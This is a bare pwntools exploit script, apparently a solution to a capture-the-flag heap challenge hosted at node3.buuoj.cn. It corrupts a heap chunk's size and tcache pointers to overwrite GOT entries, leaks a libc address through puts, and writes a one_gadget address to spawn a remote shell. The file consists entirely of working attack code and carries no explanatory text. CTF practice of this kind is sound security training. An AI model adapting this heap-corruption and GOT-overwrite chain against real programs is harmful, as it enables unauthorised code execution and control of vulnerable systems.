from pwn import *

io=remote('node3.buuoj.cn',25256)
libc=ELF('./libc-2.27.so')

def add(idx,size,data):
    io.recvuntil('choice: ')
    io.sendline('1')
    io.recvuntil('index: ')
    io.sendline(str(idx))
    io.recvuntil('size: ')
    io.sendline(str(size))
    io.recvuntil('content: ')
    io.send(data)

def edit(idx,data):
    io.recvuntil('choice: ')
    io.sendline('3')
    io.recvuntil('index: ')
    io.sendline(str(idx))
    io.recvuntil('content: ')
    io.send(data)

def free(idx):
    io.recvuntil('choice: ')
    io.sendline('2')
    io.recvuntil('index: ')
    io.sendline(str(idx))


puts_got=0x0602020
puts_plt=0x0400790
free_got=0x602018

add(16,0x18,'a'*0x18)#0
add(1,0x20,'b'*0x20)#1
add(7,0x30,'c')#2
add(9,0x40,'d')#3

free(1)
edit(0,'a'*8+p64(0xc1)+p64(puts_got))
add(1,0x20,'c')#1
add(5,0x20,'\xc0')#4 #get puts_got

free(7)
free(9)
free(1)
add(1,0xb0,'a'*0x28+p64(0x41)+p64(free_got)+'a'*0x30+p64(0x51)+p64(puts_got))#1
add(3,0x30,'c')#5
add(0,0x30,p64(puts_plt))

free(5)
puts_add=u64(io.recv(6).ljust(8,'\x00'))
print(hex(puts_add))
libc_base=puts_add-libc.sym['puts']
one_gadget=libc_base+0x4f322

add(10,0x40,'d')
add(11,0x40,p64(one_gadget))

io.interactive()